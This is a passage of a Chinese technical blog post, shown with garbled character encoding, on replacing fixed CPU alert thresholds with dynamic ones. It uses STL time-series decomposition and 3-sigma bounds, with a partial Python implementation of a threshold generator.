thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å‡Œæ™¨2ç‚¹ï¼Œè¿ç»´å·¥ç¨‹å¸ˆå°åˆ˜çš„æ‰‹æœºå†æ¬¡å“èµ·åˆºè€³çš„å‘Šè­¦é“ƒå£°ã€‚è¿™å·²ç»æ˜¯æœ¬å‘¨ç¬¬16æ¬¡æ·±å¤œå‘Šè­¦äº†ã€‚ä»–ç–²æƒ«åœ°æ‰“å¼€ç›‘æ§å¹³å°ï¼Œå‘ç°CPUä½¿ç”¨ç‡è¾¾åˆ°äº†85%â€”â€”è§¦å‘äº†å›ºå®šé˜ˆå€¼80%çš„å‘Šè­¦è§„åˆ™ã€‚ç„¶è€Œï¼ŒæŸ¥çœ‹å†å²æ•°æ®åä»–å‘ç°ï¼Œè¿™ä¸ªæ—¶æ®µæ­£æ˜¯ä¸šåŠ¡é«˜å³°æœŸï¼Œ85%çš„CPUä½¿ç”¨ç‡å®Œå…¨åœ¨æ­£å¸¸èŒƒå›´å†…ã€‚</p>
<p>è¿™ä¸æ˜¯ä¸ªä¾‹ã€‚æ ¹æ®Gartnerçš„è°ƒç ”æŠ¥å‘Šï¼Œä¼ä¸šITè¿ç»´å›¢é˜Ÿå¹³å‡æ¯å¤©æ”¶åˆ°æ•°ç™¾æ¡å‘Šè­¦ï¼Œä½†å…¶ä¸­è¶…è¿‡70%æ˜¯è¯¯æŠ¥æˆ–æ— éœ€å¤„ç†çš„å™ªéŸ³ã€‚è¿™ç§"ç‹¼æ¥äº†"ç»¼åˆå¾ä¸ä»…æ¶ˆè€—äº†å¤§é‡äººåŠ›ï¼Œæ›´ä¸¥é‡çš„æ˜¯ï¼šå½“çœŸæ­£çš„æ•…éšœå‘ç”Ÿæ—¶ï¼Œå‘Šè­¦å¾€å¾€æ·¹æ²¡åœ¨å™ªéŸ³ä¸­è¢«å¿½è§†ã€‚</p>
<p>ä¼ ç»Ÿå›ºå®šé˜ˆå€¼å‘Šè­¦ç³»ç»Ÿçš„æ ¸å¿ƒé—®é¢˜åœ¨äºï¼šå®ƒæ— æ³•ç†è§£ä¸šåŠ¡çš„åŠ¨æ€ç‰¹æ€§ã€‚ä¸šåŠ¡ç³»ç»Ÿçš„è´Ÿè½½å…·æœ‰æ˜æ˜¾çš„æ—¶é—´å‘¨æœŸæ€§ï¼ˆå·¥ä½œæ—¥vså‘¨æœ«ã€ç™½å¤©vså¤œæ™šï¼‰ã€å¢é•¿è¶‹åŠ¿æ€§ï¼ˆç”¨æˆ·é‡æŒç»­å¢é•¿ï¼‰ä»¥åŠçªå‘æ€§ï¼ˆä¿ƒé”€æ´»åŠ¨ã€çƒ­ç‚¹äº‹ä»¶ï¼‰ã€‚ç”¨ä¸€ä¸ªé™æ€çš„æ•°å€¼å»è¡¡é‡è¿™æ ·ä¸€ä¸ªåŠ¨æ€ç³»ç»Ÿï¼Œå¿…ç„¶ä¼šäº§ç”Ÿå¤§é‡çš„è¯¯åˆ¤ã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥æ¢è®¨å¦‚ä½•æ„å»ºä¸€ä¸ªå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„åŠ¨æ€é˜ˆå€¼å‘Šè­¦ç³»ç»Ÿï¼Œä»ç†è®ºåŸºç¡€åˆ°å·¥ç¨‹å®è·µï¼Œå¸®åŠ©ä½ å½»åº•è§£å†³å‘Šè­¦ç–²åŠ³é—®é¢˜ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ç†è§£é—®é¢˜æœ¬è´¨ï¼šä¸ºä»€ä¹ˆå›ºå®šé˜ˆå€¼ä¼šå¤±æ•ˆï¼Ÿ</h2>
<h3 data-id="heading-1">1.1 ä¸šåŠ¡ç³»ç»Ÿçš„ä¸‰å¤§åŠ¨æ€ç‰¹å¾</h3>
<p>å‘¨æœŸæ€§ï¼ˆSeasonalityï¼‰</p>
<ul>
<li>æ—¥å‘¨æœŸï¼šç”µå•†ç³»ç»Ÿåœ¨æ™šä¸Š8-10ç‚¹æµé‡è¾¾åˆ°å³°å€¼</li>
<li>å‘¨å‘¨æœŸï¼šB2Bç³»ç»Ÿå‘¨æœ«æµé‡éª¤é™</li>
<li>å¹´å‘¨æœŸï¼šæ—…æ¸¸ç½‘ç«™åœ¨èŠ‚å‡æ—¥æµé‡æš´å¢</li>
</ul>
<p>è¶‹åŠ¿æ€§ï¼ˆTrendï¼‰</p>
<ul>
<li>ä¸šåŠ¡å¢é•¿ï¼šç”¨æˆ·é‡ä»10ä¸‡å¢é•¿åˆ°100ä¸‡ï¼ŒåŸºçº¿è´Ÿè½½æŒç»­ä¸Šå‡</li>
<li>ç³»ç»Ÿä¼˜åŒ–ï¼šä»£ç é‡æ„åèµ„æºæ¶ˆè€—ä¸‹é™</li>
<li>å®¹é‡æ‰©å±•ï¼šå¢åŠ æœåŠ¡å™¨åå•æœºè´Ÿè½½é™ä½</li>
</ul>
<p>éšæœºæ³¢åŠ¨ï¼ˆNoiseï¼‰</p>
<ul>
<li>æ­£å¸¸çš„ä¸šåŠ¡æŠ–åŠ¨</li>
<li>ç½‘ç»œå»¶è¿Ÿçš„éšæœºæ€§</li>
<li>ç³»ç»Ÿè°ƒåº¦çš„ä¸ç¡®å®šæ€§</li>
</ul>
<h3 data-id="heading-2">1.2 å›ºå®šé˜ˆå€¼çš„ä¸‰å¤§å›°å¢ƒ</h3>
<p>å›°å¢ƒä¸€ï¼šé˜ˆå€¼è®¾ç½®çš„ä¸¤éš¾é€‰æ‹©</p>
<p>è®¾ç½®è¿‡é«˜ â†’ çœŸå®æ•…éšœæ— æ³•åŠæ—¶å‘ç° â†’ ä¸šåŠ¡æŸå¤± è®¾ç½®è¿‡ä½ â†’ å¤§é‡è¯¯æŠ¥ â†’ å‘Šè­¦ç–²åŠ³ â†’ çœŸå®å‘Šè­¦è¢«å¿½è§†</p>
<p>å›°å¢ƒäºŒï¼šæ— æ³•é€‚åº”ä¸šåŠ¡å˜åŒ– æŸç”µå•†å¹³å°çš„çœŸå®æ¡ˆä¾‹ï¼š</p>
<ul>
<li>2022å¹´Q1ï¼šæ—¥å‡è®¢å•10ä¸‡ï¼ŒCPUé˜ˆå€¼è®¾ä¸º70%</li>
<li>2023å¹´Q1ï¼šæ—¥å‡è®¢å•50ä¸‡ï¼Œä½†é˜ˆå€¼ä»æ˜¯70%</li>
<li>ç»“æœï¼šæ¯å¤©è§¦å‘æ•°ç™¾æ¬¡å‘Šè­¦ï¼Œä½†éƒ½æ˜¯"æ­£å¸¸çš„é«˜è´Ÿè½½"</li>
</ul>
<p>å›°å¢ƒä¸‰ï¼šå¿½è§†æ—¶é—´ç»´åº¦ åŒæ ·æ˜¯CPU 80%ï¼š</p>
<ul>
<li>å‡Œæ™¨3ç‚¹ â†’ å¯èƒ½æ˜¯å¼‚å¸¸ä»»åŠ¡</li>
<li>æ™šä¸Š8ç‚¹ â†’ å¯èƒ½æ˜¯æ­£å¸¸é«˜å³°</li>
<li>å›ºå®šé˜ˆå€¼æ— æ³•åŒºåˆ†è¿™ä¸¤ç§åœºæ™¯</li>
</ul>
<h2 data-id="heading-3">äºŒã€åŠ¨æ€é˜ˆå€¼çš„ç†è®ºåŸºç¡€</h2>
<h3 data-id="heading-4">2.1 æ ¸å¿ƒæ€æƒ³ï¼šä»"ç»å¯¹å€¼åˆ¤æ–­"åˆ°"ç›¸å¯¹åç¦»åˆ¤æ–­"</h3>
<p>ä¼ ç»Ÿæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-css" lang="css">if current_value &gt; FIXED_THRESHOLD:
    <span class="hljs-built_in">trigger_alert</span>()
</code></pre>
<p>åŠ¨æ€é˜ˆå€¼æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">expected_value = <span class="hljs-built_in">predict_based_on_history</span>(timestamp)
deviation = <span class="hljs-built_in">abs</span>(current_value - expected_value)
if deviation &gt; dynamic_threshold:
    <span class="hljs-built_in">trigger_alert</span>()
</code></pre>
<p>å…³é”®è½¬å˜ï¼šä¸å†åˆ¤æ–­æŒ‡æ ‡çš„ç»å¯¹å€¼ï¼Œè€Œæ˜¯åˆ¤æ–­å½“å‰å€¼ç›¸å¯¹äº"é¢„æœŸå€¼"çš„åç¦»ç¨‹åº¦ã€‚</p>
<h3 data-id="heading-5">2.2 æ—¶é—´åºåˆ—åˆ†è§£ï¼šSTLæ–¹æ³•</h3>
<p>STLï¼ˆSeasonal and Trend decomposition using Loessï¼‰æ˜¯ä¸€ç§å¼ºå¤§çš„æ—¶é—´åºåˆ—åˆ†è§£æ–¹æ³•ï¼Œå®ƒå°†è§‚æµ‹å€¼åˆ†è§£ä¸ºä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼š Y(t) = T(t) + S(t) + R(t)</p>
<ul>
<li>T(t) - è¶‹åŠ¿é¡¹ï¼ˆTrendï¼‰ï¼šåæ˜ é•¿æœŸå˜åŒ–æ–¹å‘</li>
<li>S(t) - å­£èŠ‚é¡¹ï¼ˆSeasonalï¼‰ï¼šåæ˜ å‘¨æœŸæ€§æ³¢åŠ¨</li>
<li>R(t) - æ®‹å·®é¡¹ï¼ˆResidualï¼‰ï¼šå»é™¤è¶‹åŠ¿å’Œå­£èŠ‚åçš„éšæœºæ³¢åŠ¨</li>
</ul>
<p>ä¸ºä»€ä¹ˆé€‰æ‹©STLï¼Ÿ</p>
<ol>
<li>é²æ£’æ€§å¼ºï¼šå¯¹å¼‚å¸¸å€¼ä¸æ•æ„Ÿ</li>
<li>çµæ´»æ€§é«˜ï¼šå­£èŠ‚å‘¨æœŸå¯è‡ªå®šä¹‰</li>
<li>å¯è§£é‡Šæ€§å¥½ï¼šåˆ†è§£ç»“æœç›´è§‚æ˜“æ‡‚</li>
</ol>
<h3 data-id="heading-6">2.3 ç»Ÿè®¡è¿‡ç¨‹æ§åˆ¶ï¼ˆSPCï¼‰ç†è®º</h3>
<p>å€Ÿé‰´å·¥ä¸šè´¨é‡ç®¡ç†ä¸­çš„æ§åˆ¶å›¾æ€æƒ³ï¼š</p>
<p>3ÏƒåŸåˆ™ï¼š</p>
<ul>
<li>æ­£æ€åˆ†å¸ƒä¸‹ï¼Œ99.7%çš„æ•°æ®è½åœ¨ Î¼Â±3Ïƒ èŒƒå›´å†…</li>
<li>è¶…å‡ºæ­¤èŒƒå›´çš„æ•°æ®ç‚¹è¢«è§†ä¸º"å¼‚å¸¸"</li>
</ul>
<p>åŠ¨æ€é˜ˆå€¼è®¡ç®—å…¬å¼ï¼š Upper_Bound(t) = T(t) + S(t) + 3 Ã— Ïƒ(R) Lower_Bound(t) = T(t) + S(t) - 3 Ã— Ïƒ(R) å…¶ä¸­ ÏƒÂ® æ˜¯æ®‹å·®çš„æ ‡å‡†å·®ï¼Œåæ˜ äº†"æ­£å¸¸æ³¢åŠ¨"çš„å¹…åº¦ã€‚</p>
<h2 data-id="heading-7">ä¸‰ã€å·¥ç¨‹å®ç°ï¼šæ„å»ºç”Ÿäº§çº§åŠ¨æ€é˜ˆå€¼ç³»ç»Ÿ</h2>
<h3 data-id="heading-8">3.1 ç³»ç»Ÿæ¶æ„è®¾è®¡</h3>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ æ•°æ®é‡‡é›†å±‚  â”‚ â† Prometheus/InfluxDB
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ æ•°æ®é¢„å¤„ç†  â”‚ â† å¼‚å¸¸å€¼è¿‡æ»¤ã€ç¼ºå¤±å€¼å¡«å……
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ é˜ˆå€¼è®¡ç®—å¼•æ“â”‚ â† STLåˆ†è§£ + åŠ¨æ€é˜ˆå€¼ç”Ÿæˆ
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ å‘Šè­¦å†³ç­–å±‚  â”‚ â† å¤šç»´åº¦åˆ¤æ–­ + å‘Šè­¦æŠ‘åˆ¶
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ å‘Šè­¦è¾“å‡ºå±‚  â”‚ â† é’‰é’‰/é‚®ä»¶/PagerDuty
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</span></code></pre>
<h3 data-id="heading-9">3.2 æ ¸å¿ƒä»£ç å®ç°ä¸è¯¦è§£</h3>
<h3 data-id="heading-10">3.2.1 å®Œæ•´çš„åŠ¨æ€é˜ˆå€¼ç”Ÿæˆå™¨</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> statsmodels.tsa.seasonal <span class="hljs-keyword">import</span> STL
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque
<span class="hljs-keyword">import</span> logging

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicThresholdGenerator</span>:
    <span class="hljs-string">"""
    åŠ¨æ€é˜ˆå€¼ç”Ÿæˆå™¨
    
    æ ¸å¿ƒåŠŸèƒ½ï¼š
    1. ç»´æŠ¤æ»‘åŠ¨çª—å£å†å²æ•°æ®
    2. STLæ—¶é—´åºåˆ—åˆ†è§£
    3. åŠ¨æ€é˜ˆå€¼è®¡ç®—
    4. å¼‚å¸¸æ£€æµ‹ä¸ç½®ä¿¡åº¦è¯„ä¼°
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, 
                 window_size=<span class="hljs-number">168</span>,      <span class="hljs-comment"># 7å¤© Ã— 24å°æ—¶</span>
                 seasonal_period=<span class="hljs-number">24</span>,   <span class="hljs-comment"># 24å°æ—¶å­£èŠ‚å‘¨æœŸ</span>
                 sigma_multiplier=<span class="hljs-number">3</span>,   <span class="hljs-comment"># 3ÏƒåŸåˆ™</span>
                 min_samples=<span class="hljs-number">48</span></span>):      <span class="hljs-comment"># æœ€å°‘éœ€è¦2å¤©æ•°æ®</span>
        <span class="hljs-string">"""
        å‚æ•°è¯´æ˜ï¼š
        - window_size: æ»‘åŠ¨çª—å£å¤§å°ï¼ˆå°æ—¶æ•°ï¼‰
        - seasonal_period: å­£èŠ‚å‘¨æœŸï¼ˆå°æ—¶æ•°ï¼‰
        - sigma_multiplier: æ ‡å‡†å·®å€æ•°
        - min_samples: å¼€å§‹è®¡ç®—é˜ˆå€¼çš„æœ€å°æ ·æœ¬æ•°
        """</span>
        self.window_size = window_size
        self.seasonal_period = seasonal_period
        self.sigma_multiplier = sigma_multiplier
        self.min_samples = min_samples
        
        <span class="hljs-comment"># ä½¿ç”¨dequeå®ç°é«˜æ•ˆçš„æ»‘åŠ¨çª—å£</span>
        self.history = deque(maxlen=window_size)
        
        <span class="hljs-comment"># ç¼“å­˜ä¸Šä¸€æ¬¡çš„åˆ†è§£ç»“æœï¼Œç”¨äºå¼‚å¸¸æ£€æµ‹</span>
        self.last_decomposition = <span class="hljs-literal">None</span>
        
        <span class="hljs-comment"># ç»Ÿè®¡ä¿¡æ¯</span>
        self.stats = {
            <span class="hljs-string">'total_points'</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">'alerts_triggered'</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">'false_positive_rate'</span>: <span class="hljs-number">0.0</span>
        }
        
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_and_get_thresholds</span>(<span class="hljs-params">self, new_data_point, timestamp</span>):
        <span class="hljs-string">"""
        æ›´æ–°æ•°æ®å¹¶è¿”å›å½“å‰åŠ¨æ€é˜ˆå€¼
        
        Args:
            new_data_point: æ–°çš„ç›‘æ§æŒ‡æ ‡å€¼
            timestamp: æ—¶é—´æˆ³ï¼ˆdatetimeå¯¹è±¡ï¼‰
        
        Returns:
            dict: åŒ…å«é˜ˆå€¼ã€å‘Šè­¦çŠ¶æ€ã€ç½®ä¿¡åº¦ç­‰ä¿¡æ¯
        """</span>
        <span class="hljs-comment"># 1. æ•°æ®éªŒè¯ä¸é¢„å¤„ç†</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._validate_data(new_data_point):
            <span class="hljs-keyword">return</span> self._get_default_response(new_data_point)
        
        <span class="hljs-comment"># 2. æ›´æ–°å†å²æ•°æ®</span>
        self.history.append({
            <span class="hljs-string">'timestamp'</span>: timestamp,
            <span class="hljs-string">'value'</span>: new_data_point
        })
        self.stats[<span class="hljs-string">'total_points'</span>] += <span class="hljs-number">1</span>
        
        <span class="hljs-comment"># 3. æ£€æŸ¥æ˜¯å¦æœ‰è¶³å¤Ÿçš„æ•°æ®è¿›è¡Œåˆ†æ</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.history) &lt; self.min_samples:
            <span class="hljs-keyword">return</span> self._get_bootstrap_response(new_data_point)
        
        <span class="hljs-comment"># 4. æ‰§è¡Œæ—¶é—´åºåˆ—åˆ†è§£</span>
        <span class="hljs-keyword">try</span>:
            decomposition = self._perform_stl_decomposition()
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            self.logger.error(<span class="hljs-string">f"STLåˆ†è§£å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            <span class="hljs-keyword">return</span> self._get_fallback_response(new_data_point)
        
        <span class="hljs-comment"># 5. è®¡ç®—åŠ¨æ€é˜ˆå€¼</span>
        thresholds = self._calculate_dynamic_thresholds(decomposition)
        
        <span class="hljs-comment"># 6. å¼‚å¸¸æ£€æµ‹</span>
        is_alert, alert_type = self._detect_anomaly(
            new_data_point, 
            thresholds, 
            decomposition
        )
        
        <span class="hljs-comment"># 7. è®¡ç®—ç½®ä¿¡åº¦</span>
        confidence = self._calculate_confidence(decomposition)
        
        <span class="hljs-comment"># 8. æ›´æ–°ç»Ÿè®¡ä¿¡æ¯</span>
        <span class="hljs-keyword">if</span> is_alert:
            self.stats[<span class="hljs-string">'alerts_triggered'</span>] += <span class="hljs-number">1</span>
        
        <span class="hljs-comment"># 9. æ„å»ºè¿”å›ç»“æœ</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'timestamp'</span>: timestamp,
            <span class="hljs-string">'current_value'</span>: new_data_point,
            <span class="hljs-string">'expected_value'</span>: thresholds[<span class="hljs-string">'expected'</span>],
            <span class="hljs-string">'upper_bound'</span>: thresholds[<span class="hljs-string">'upper'</span>],
            <span class="hljs-string">'lower_bound'</span>: thresholds[<span class="hljs-string">'lower'</span>],
            <span class="hljs-string">'is_alert'</span>: is_alert,
            <span class="hljs-string">'alert_type'</span>: alert_type,
            <span class="hljs-string">'confidence'</span>: confidence,
            <span class="hljs-string">'deviation_percentage'</span>: self._calculate_deviation_percentage(
                new_data_point, thresholds[<span class="hljs-string">'expected'</span>]
            ),
            <span class="hljs-string">'trend'</span>: decomposition[<span class="hljs-string">'trend_direction'</span>],
            <span class="hljs-string">'seasonality_factor'</span>: decomposition[<span class="hljs-string">'seasonal_factor'</span>]
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_perform_stl_decomposition</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æ‰§è¡ŒSTLæ—¶é—´åºåˆ—åˆ†è§£"""</span>
        <span class="hljs-comment"># æå–æ—¶é—´åºåˆ—å€¼</span>
        values = np.array([point[<span class="hljs-string">'value'</span>] <span class="hljs-keyword">for</span> point <span class="hljs-keyword">in</span> self.history])
        
        <span class="hljs-comment"># å¤„ç†ç¼ºå¤±å€¼å’Œå¼‚å¸¸å€¼</span>
        values = self._preprocess_series(values)
        
        <span class="hljs-comment"># STLåˆ†è§£</span>
        stl = STL(
            values, 
            seasonal=self.seasonal_period,
            trend=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># è‡ªåŠ¨é€‰æ‹©è¶‹åŠ¿çª—å£</span>
            robust=<span class="hljs-literal">True</span>  <span class="hljs-comment"># ä½¿ç”¨é²æ£’æ€§æ‹Ÿåˆï¼Œå¯¹å¼‚å¸¸å€¼ä¸æ•æ„Ÿ</span>
        )
        result = stl.fit()
        
        <span class="hljs-comment"># æå–å„ç»„æˆéƒ¨åˆ†</span>
        trend = result.trend
        seasonal = result.seasonal
        residual = result.resid
        
        <span class="hljs-comment"># è®¡ç®—æ®‹å·®ç»Ÿè®¡é‡</span>
        residual_std = np.std(residual)
        residual_mean = np.mean(residual)
        
        <span class="hljs-comment"># åˆ¤æ–­è¶‹åŠ¿æ–¹å‘</span>
        trend_direction = self._analyze_trend(trend)
        
        <span class="hljs-comment"># è®¡ç®—å­£èŠ‚æ€§å› å­ï¼ˆå½“å‰æ—¶åˆ»çš„å­£èŠ‚æ€§å¼ºåº¦ï¼‰</span>
        seasonal_factor = seasonal[-<span class="hljs-number">1</span>] / np.mean(np.<span class="hljs-built_in">abs</span>(seasonal))
        
        decomposition = {
            <span class="hljs-string">'trend'</span>: trend,
            <span class="hljs-string">'seasonal'</span>: seasonal,
            <span class="hljs-string">'residual'</span>: residual,
            <span class="hljs-string">'residual_std'</span>: residual_std,
            <span class="hljs-string">'residual_mean'</span>: residual_mean,
            <span class="hljs-string">'trend_direction'</span>: trend_direction,
            <span class="hljs-string">'seasonal_factor'</span>: seasonal_factor,
            <span class="hljs-string">'current_trend'</span>: trend[-<span class="hljs-number">1</span>],
            <span class="hljs-string">'current_seasonal'</span>: seasonal[-<span class="hljs-number">1</span>]
        }
        
        self.last_decomposition = decomposition
        <span class="hljs-keyword">return</span> decomposition
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_dynamic_thresholds</span>(<span class="hljs-params">self, decomposition</span>):
        <span class="hljs-string">"""è®¡ç®—åŠ¨æ€é˜ˆå€¼"""</span>
        <span class="hljs-comment"># é¢„æœŸå€¼ = è¶‹åŠ¿ + å­£èŠ‚æ€§</span>
        expected_value = (
            decomposition[<span class="hljs-string">'current_trend'</span>] + 
            decomposition[<span class="hljs-string">'current_seasonal'</span>]
        )
        
        <span class="hljs-comment"># åŠ¨æ€æ³¢åŠ¨èŒƒå›´ = sigma_multiplier Ã— æ®‹å·®æ ‡å‡†å·®</span>
        dynamic_range = (
            self.sigma_multiplier * 
            decomposition[<span class="hljs-string">'residual_std'</span>]
        )
        
        <span class="hljs-comment"># è€ƒè™‘è¶‹åŠ¿æ–¹å‘çš„è‡ªé€‚åº”è°ƒæ•´</span>
        <span class="hljs-keyword">if</span> decomposition[<span class="hljs-string">'trend_direction'</span>] == <span class="hljs-string">'increasing'</span>:
            <span class="hljs-comment"># ä¸Šå‡è¶‹åŠ¿ï¼šæ”¾å®½ä¸Šç•Œï¼Œæ”¶ç´§ä¸‹ç•Œ</span>
            upper_bound = expected_value + dynamic_range * <span class="hljs-number">1.2</span>
            lower_bound = expected_value - dynamic_range * <span class="hljs-number">0.8</span>
        <span class="hljs-keyword">elif</span> decomposition[<span class="hljs-string">'trend_direction'</span>] == <span class="hljs-string">'decreasing'</span>:
            <span class="hljs-comment"># ä¸‹é™è¶‹åŠ¿ï¼šæ”¶ç´§ä¸Šç•Œï¼Œæ”¾å®½ä¸‹ç•Œ</span>
            upper_bound = expected_value + dynamic_range * <span class="hljs-number">0.8</span>
            lower_bound = expected_value - dynamic_range * <span class="hljs-number">1.2</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># å¹³ç¨³è¶‹åŠ¿ï¼šå¯¹ç§°é˜ˆå€¼</span>
            upper_bound = expected_value + dynamic_range
            lower_bound = expected_value - dynamic_range
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'expected'</span>: expected_value,
            <span class="hljs-string">'upper'</span>: upper_bound,
            <span class="hljs-string">'lower'</span>: lower_bound,
            <span class="hljs-string">'dynamic_range'</span>: dynamic_range
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_detect_anomaly</span>(<span class="hljs-params">self, current_value, thresholds, decomposition</span>):
        <span class="hljs-string">"""
        å¤šç»´åº¦å¼‚å¸¸æ£€æµ‹
        
        æ£€æµ‹ç»´åº¦ï¼š
        1. é˜ˆå€¼çªç ´æ£€æµ‹
        2. è¿ç»­åç¦»æ£€æµ‹
        3. çªå˜æ£€æµ‹
        """</span>
        is_alert = <span class="hljs-literal">False</span>
        alert_type = <span class="hljs-literal">None</span>
        
        <span class="hljs-comment"># ç»´åº¦1ï¼šåŸºç¡€é˜ˆå€¼æ£€æµ‹</span>
        <span class="hljs-keyword">if</span> current_value &gt; thresholds[<span class="hljs-string">'upper'</span>]:
            is_alert = <span class="hljs-literal">True</span>
            alert_type = <span class="hljs-string">'upper_breach'</span>
        <span class="hljs-keyword">elif</span> current_value &lt; thresholds[<span class="hljs-string">'lower'</span>]:
            is_alert = <span class="hljs-literal">True</span>
            alert_type = <span class="hljs-string">'lower_breach'</span>
        
        <span class="hljs-comment"># ç»´åº¦2ï¼šè¿ç»­åç¦»æ£€æµ‹ï¼ˆæœ€è¿‘3ä¸ªç‚¹éƒ½åç¦»ï¼‰</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.history) &gt;= <span class="hljs-number">3</span>:
            recent_values = [p[<span class="hljs-string">'value'</span>] <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(self.history)[-<span class="hljs-number">3</span>:]]
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(v &gt; thresholds[<span class="hljs-string">'expected'</span>] * <span class="hljs-number">1.1</span> <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> recent_values):
                is_alert = <span class="hljs-literal">True</span>
                alert_type = <span class="hljs-string">'sustained_high'</span>
        
        <span class="hljs-comment"># ç»´åº¦3ï¼šçªå˜æ£€æµ‹ï¼ˆç›¸å¯¹äºå‰ä¸€ä¸ªç‚¹å˜åŒ–è¶…è¿‡50%ï¼‰</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.history) &gt;= <span class="hljs-number">2</span>:
            prev_value = <span class="hljs-built_in">list</span>(self.history)[-<span class="hljs-number">2</span>][<span class="hljs-string">'value'</span>]
            change_rate = <span class="hljs-built_in">abs</span>(current_value - prev_value) / prev_value
            <span class="hljs-keyword">if</span> change_rate &gt; <span class="hljs-number">0.5</span>:
                is_alert = <span class="hljs-literal">True</span>
                alert_type = <span class="hljs-string">'sudden_change'</span>
        
        <span class="hljs-keyword">return</span> is_alert, alert_type
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_confidence</span>(<span class="hljs-params">self, decomposition</span>):
        <span class="hljs-string">"""
        è®¡ç®—ç½®ä¿¡åº¦
        
        ç½®ä¿¡åº¦è¶Šé«˜ï¼Œè¯´æ˜ï¼š
        1. å†å²æ•°æ®è¶Šå……è¶³
